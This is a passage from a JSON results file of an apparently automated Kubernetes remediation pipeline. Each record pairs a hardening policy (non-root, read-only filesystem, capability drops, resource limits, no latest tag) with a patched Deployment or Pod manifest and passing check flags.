false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01067",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: addresses-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: addresses-service\n  template:\n    metadata:\n      labels:\n        app: addresses-service\n    spec:\n      containers:\n      - name: addresses-service\n        image: stokei/addresses-service:stable\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        imagePullPolicy: Always\n        env:\n        - name: DB_NAME\n          value: addresses\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-user\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-password\n        - name: DB_OPTIONS\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-options\n        - name: DB_PREFIX\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-prefix\n        - name: DB_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-timeout\n        - name: QUEUE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-host\n        - name: QUEUE_PORT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-port\n        - name: QUEUE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-password\n        - name: QUEUE_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-timeout\n        - name: MICROSERVICE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq-secret\n              key: url\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01068",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: startstopdemo-687f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: startstopdemo-687f\n  template:\n    metadata:\n      labels:\n        app: startstopdemo-687f\n    spec:\n      containers:\n      - name: startstopdemo-687f\n        image: testrg12.azurecr.io/startstopdemo:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01069",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: startstopdemo-687f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: startstopdemo-687f\n  template:\n    metadata:\n      labels:\n        app: startstopdemo-687f\n    spec:\n      containers:\n      - name: startstopdemo-687f\n        image: testrg12.azurecr.io/startstopdemo:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01070",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: startstopdemo-687f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: startstopdemo-687f\n  template:\n    metadata:\n      labels:\n        app: startstopdemo-687f\n    spec:\n      containers:\n      - name: startstopdemo-687f\n        image: testrg12.azurecr.io/startstopdemo:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01071",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: startstopdemo-687f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: startstopdemo-687f\n  template:\n    metadata:\n      labels:\n        app: startstopdemo-687f\n    spec:\n      containers:\n      - name: startstopdemo-687f\n        image: testrg12.azurecr.io/startstopdemo:stable\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01072",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: startstopdemo-687f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: startstopdemo-687f\n  template:\n    metadata:\n      labels:\n        app: startstopdemo-687f\n    spec:\n      containers:\n      - name: startstopdemo-687f\n        image: testrg12.azurecr.io/startstopdemo:stable\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01073",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: statusreconciler\n  labels:\n    app: prow\n    component: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20200404-591527a41\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config-misc\n          mountPath: /etc/job-config/misc\n          readOnly: true\n        - name: job-config-master\n          mountPath: /etc/job-config/master\n          readOnly: true\n        - name: job-config-3x\n          mountPath: /etc/job-config/3.x\n          readOnly: true\n        - name: job-config-41\n          mountPath: /etc/job-config/4.1\n          readOnly: true\n        - name: job-config-42\n          mountPath: /etc/job-config/4.2\n          readOnly: true\n        - name: job-config-43\n          mountPath: /etc/job-config/4.3\n          readOnly: true\n        - name: job-config-44\n          mountPath: /etc/job-config/4.4\n          readOnly: true\n        - name: job-config-45\n          mountPath: /etc/job-config/4.5\n          readOnly: true\n        - name: job-config-46\n          mountPath: /etc/job-config/4.6\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            memory: 200Mi\n            cpu: 20m\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: github-credentials-openshift-ci-robot\n      - name: config\n        configMap:\n          name: config\n      - name: job-config-misc\n        configMap:\n          name: job-config-misc\n      - name: job-config-master\n        configMap:\n          name: job-config-master\n      - name: job-config-3x\n        configMap:\n          name: job-config-3.x\n      - name: job-config-41\n        configMap:\n          name: job-config-4.1\n      - name: job-config-42\n        configMap:\n          name: job-config-4.2\n      - name: job-config-43\n        configMap:\n          name: job-config-4.3\n      - name: job-config-44\n        configMap:\n          name: job-config-4.4\n      - name: job-config-45\n        configMap:\n          name: job-config-4.5\n      - name: job-config-46\n        configMap:\n          name: job-config-4.6\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "01074",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: statusreconciler\n  labels:\n    app: prow\n    component: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20200404-591527a41\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config-misc\n          mountPath: /etc/job-config/misc\n          readOnly: true\n        - name: job-config-master\n          mountPath: /etc/job-config/master\n          readOnly: true\n        - name: job-config-3x\n          mountPath: /etc/job-config/3.x\n          readOnly: true\n        - name: job-config-41\n          mountPath: /etc/job-config/4.1\n          readOnly: true\n        - name: job-config-42\n          mountPath: /etc/job-config/4.2\n          readOnly: true\n        - name: job-config-43\n          mountPath: /etc/job-config/4.3\n          readOnly: true\n        - name: job-config-44\n          mountPath: /etc/job-config/4.4\n          readOnly: true\n        - name: job-config-45\n          mountPath: /etc/job-config/4.5\n          readOnly: true\n        - name: job-config-46\n          mountPath: /etc/job-config/4.6\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            memory: 200Mi\n            cpu: 20m\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: github-credentials-openshift-ci-robot\n      - name: config\n        configMap:\n          name: config\n      - name: job-config-misc\n        configMap:\n          name: job-config-misc\n      - name: job-config-master\n        configMap:\n          name: job-config-master\n      - name: job-config-3x\n        configMap:\n          name: job-config-3.x\n      - name: job-config-41\n        configMap:\n          name: job-config-4.1\n      - name: job-config-42\n        configMap:\n          name: job-config-4.2\n      - name: job-config-43\n        configMap:\n          name: job-config-4.3\n      - name: job-config-44\n        configMap:\n          name: job-config-4.4\n      - name: job-config-45\n        configMap:\n          name: job-config-4.5\n      - name: job-config-46\n        configMap:\n          name: job-config-4.6\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "01075",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: statusreconciler\n  labels:\n    app: prow\n    component: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20200404-591527a41\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config-misc\n          mountPath: /etc/job-config/misc\n          readOnly: true\n        - name: job-config-master\n          mountPath: /etc/job-config/master\n          readOnly: true\n        - name: job-config-3x\n          mountPath: /etc/job-config/3.x\n          readOnly: true\n        - name: job-config-41\n          mountPath: /etc/job-config/4.1\n          readOnly: true\n        - name: job-config-42\n          mountPath: /etc/job-config/4.2\n          readOnly: true\n        - name: job-config-43\n          mountPath: /etc/job-config/4.3\n          readOnly: true\n        - name: job-config-44\n          mountPath: /etc/job-config/4.4\n          readOnly: true\n        - name: job-config-45\n          mountPath: /etc/job-config/4.5\n          readOnly: true\n        - name: job-config-46\n          mountPath: /etc/job-config/4.6\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            memory: 200Mi\n            cpu: 20m\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: github-credentials-openshift-ci-robot\n      - name: config\n        configMap:\n          name: config\n      - name: job-config-misc\n        configMap:\n          name: job-config-misc\n      - name: job-config-master\n        configMap:\n          name: job-config-master\n      - name: job-config-3x\n        configMap:\n          name: job-config-3.x\n      - name: job-config-41\n        configMap:\n          name: job-config-4.1\n      - name: job-config-42\n        configMap:\n          name: job-config-4.2\n      - name: job-config-43\n        configMap:\n          name: job-config-4.3\n      - name: job-config-44\n        configMap:\n          name: job-config-4.4\n      - name: job-config-45\n        configMap:\n          name: job-config-4.5\n      - name: job-config-46\n        configMap:\n          name: job-config-4.6\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "01076",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: security-context-demo\nspec:\n  containers:\n  - name: sec-ctx-demo\n    image: gcr.io/google-samples/node-hello:1.0\n    securityContext:\n      capabilities:\n        add:\n        - CHOWN\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      readOnlyRootFilesystem: true\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01077",
    "policy_id": "drop_capabilities",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: security-context-demo\nspec:\n  containers:\n  - name: sec-ctx-demo\n    image: gcr.io/google-samples/node-hello:1.0\n    securityContext:\n      capabilities:\n        add:\n        - CHOWN\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01078",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: security-context-demo\nspec:\n  containers:\n  - name: sec-ctx-demo\n    image: gcr.io/google-samples/node-hello:1.0\n    securityContext:\n      capabilities:\n        add:\n        - CHOWN\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      privileged: false\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01079",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: security-context-demo\nspec:\n  containers:\n  - name: sec-ctx-demo\n    image: gcr.io/google-samples/node-hello:1.0\n    securityContext:\n      capabilities:\n        add:\n        - CHOWN\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01080",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: security-context-demo\nspec:\n  containers:\n  - name: sec-ctx-demo\n    image: gcr.io/google-samples/node-hello:1.0\n    securityContext:\n      capabilities:\n        add:\n        - CHOWN\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01081",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01082",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01083",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-open-match-backend\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      - name: wait-om-function\n        image: busybox:stable\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}:stable'\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            